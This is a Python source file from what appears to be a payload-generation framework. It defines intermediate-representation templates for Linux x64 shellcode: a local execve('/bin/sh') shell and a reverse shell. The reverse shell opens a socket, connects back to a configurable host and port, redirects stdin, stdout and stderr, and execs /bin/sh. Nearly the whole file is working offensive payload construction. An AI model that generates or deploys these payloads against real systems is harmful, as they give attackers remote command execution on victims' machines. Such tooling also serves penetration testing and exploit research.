"""Linux x64 reference workflows using the Syscall IR node.

Reference workflows:
  - execve_shell: execve("/bin/sh", NULL, NULL)
  - reverse_shell: socket, connect, dup2 x3, execve("/bin/sh")
"""
from __future__ import annotations

import socket as _socket
import struct as _struct

from ..payload_templates.base import TemplateConfig
from .ir import (
    AddressOf,
    AllocateStruct,
    Block,
    Compare,
    ConstructString,
    Immediate,
    Input,
    Jump,
    NameRef,
    SuccessPredicate,
    Syscall,
    Terminate,
    TerminateStyle,
    Workflow,
    WriteStructField,
    ZeroStruct,
)
from .reference import WorkflowTemplate
from .validator import validate


def build_linux_execve_shell_workflow() -> Workflow:
    """execve("/bin/sh", NULL, NULL)."""
    return Workflow(
        name="ir_linux_execve_shell",
        blocks=(
            Block("entry", (
                ConstructString("shell", "/bin/sh"),
                Syscall(
                    number=59,
                    arguments=(
                        AddressOf("shell"),
                        Immediate(0),
                        Immediate(0),
                    ),
                ),
                Terminate(TerminateStyle.HANG),
            )),
        ),
        entry="entry",
    )


class IRLinuxExecveShellTemplate(WorkflowTemplate):
    def __init__(self) -> None:
        super().__init__(build_linux_execve_shell_workflow())

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [("Shell", "/bin/sh")]


def build_linux_reverse_shell_workflow(
    lhost: str = "127.0.0.1",
    lport: int = 4444,
) -> Workflow:
    """socket -> connect -> dup2 x3 -> execve("/bin/sh")."""
    ip_packed = _struct.unpack("!I", _socket.inet_aton(lhost))[0]
    port_be = _struct.unpack("!H", _struct.pack("!H", lport))[0]

    return Workflow(
        name="ir_linux_reverse_shell",
        blocks=(
            Block("entry", (
                Syscall(
                    number=41,
                    arguments=(Immediate(2), Immediate(1), Immediate(0)),
                    result="sockfd",
                ),
                Compare(
                    "sockfd",
                    SuccessPredicate.SIGNED_NEGATIVE,
                    true_block="fail",
                    false_block="connect_phase",
                ),
            )),
            Block("connect_phase", (
                AllocateStruct("addr", "sockaddr_in"),
                ZeroStruct("addr"),
                WriteStructField("addr", "sin_family", Immediate(2)),
                WriteStructField("addr", "sin_port", Immediate(port_be)),
                WriteStructField("addr", "sin_addr", Immediate(ip_packed)),
                Syscall(
                    number=42,
                    arguments=(
                        NameRef("sockfd"),
                        AddressOf("addr"),
                        Immediate(16),
                    ),
                    result="conn_ret",
                ),
                Compare(
                    "conn_ret",
                    SuccessPredicate.SIGNED_NEGATIVE,
                    true_block="fail",
                    false_block="dup_phase",
                ),
            )),
            Block("dup_phase", (
                Syscall(33, (NameRef("sockfd"), Immediate(2))),
                Syscall(33, (NameRef("sockfd"), Immediate(1))),
                Syscall(33, (NameRef("sockfd"), Immediate(0))),
                Jump("exec_phase"),
            )),
            Block("exec_phase", (
                ConstructString("shell", "/bin/sh"),
                Syscall(
                    number=59,
                    arguments=(
                        AddressOf("shell"),
                        Immediate(0),
                        Immediate(0),
                    ),
                ),
                Terminate(TerminateStyle.HANG),
            )),
            Block("fail", (
                Syscall(60, (Immediate(1),)),
                Terminate(TerminateStyle.HANG),
            )),
        ),
        entry="entry",
    )


class IRLinuxReverseShellTemplate(WorkflowTemplate):
    def __init__(self) -> None:
        super().__init__(build_linux_reverse_shell_workflow())

    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
        lhost = config.lhost or "127.0.0.1"
        lport = config.lport or 4444
        return build_linux_reverse_shell_workflow(lhost, lport)

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Connect-back IP", config.lhost or "127.0.0.1"),
            ("Connect-back port", str(config.lport or 4444)),
        ]
